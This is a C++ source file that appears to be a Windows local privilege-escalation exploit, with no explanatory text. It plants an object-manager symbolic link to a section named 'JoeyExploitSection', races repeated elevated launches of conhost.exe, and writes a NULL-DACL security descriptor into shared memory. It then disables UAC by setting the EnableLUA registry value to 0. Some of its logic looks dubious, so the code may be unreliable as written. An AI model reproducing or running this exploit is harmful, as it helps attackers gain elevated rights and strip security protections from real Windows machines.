#include <Windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI* _NtCreateSymbolicLinkObject)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PUNICODE_STRING);
typedef NTSTATUS (NTAPI* _NtOpenSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);

void WeaponizedPulse(void* pSharedMemory) {
    SECURITY_DESCRIPTOR sd;
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
    memcpy(pSharedMemory, &sd, sizeof(sd));
}

DWORD WINAPI TriggerRace(LPVOID lpParam) {
    SHELLEXECUTEINFO shi = { sizeof(shi), 0, NULL, L"runas", L"conhost.exe", L"", L"", SW_HIDE };
    while (true) {
        ShellExecuteEx(&shi);
        for (int i = 0; i < 100; i++) YieldProcessor();
    }
    return 0;
}

int wmain() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto NtCreateSymbolicLinkObject = (_NtCreateSymbolicLinkObject)GetProcAddress(ntdll, "NtCreateSymbolicLinkObject");
    auto NtOpenSection = (_NtOpenSection)GetProcAddress(ntdll, "NtOpenSection");

    HANDLE hLink = NULL, hSection = NULL, hMapping = NULL;
    UNICODE_STRING linkName, targetName;
    OBJECT_ATTRIBUTES objAttr;

    RtlInitUnicodeString(&linkName, L"\\Sessions\\1\\BaseNamedObjects\\RestrictedServiceConfig");
    RtlInitUnicodeString(&targetName, L"\\BaseNamedObjects\\JoeyExploitSection");
    InitializeObjectAttributes(&objAttr, &linkName, OBJ_CASE_INSENSITIVE, NULL, NULL);
    if (NtCreateSymbolicLinkObject(&hLink, SYMBOLIC_LINK_ALL_ACCESS, &objAttr, &targetName) != 0) return 1;

    hSection = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, 0x1000, L"JoeyExploitSection");
    void* pSharedMemory = MapViewOfFile(hSection, FILE_MAP_ALL_ACCESS, 0, 0, 0);
    memset(pSharedMemory, 0xFF, 0x1000);

    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
    CreateThread(NULL, 0, TriggerRace, NULL, 0, NULL);

    RtlInitUnicodeString(&targetName, L"\\BaseNamedObjects\\JoeyExploitSection");
    InitializeObjectAttributes(&objAttr, &targetName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    while (true) {
        if (NtOpenSection(&hMapping, SECTION_ALL_ACCESS, &objAttr) == 0) {
            WeaponizedPulse(pSharedMemory);
            break;
        }
    }

    HKEY hKey;
    DWORD val = 0;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "EnableLUA", 0, REG_DWORD, (const BYTE*)&val, 4);
        RegCloseKey(hKey);
    }

    return 0;
}
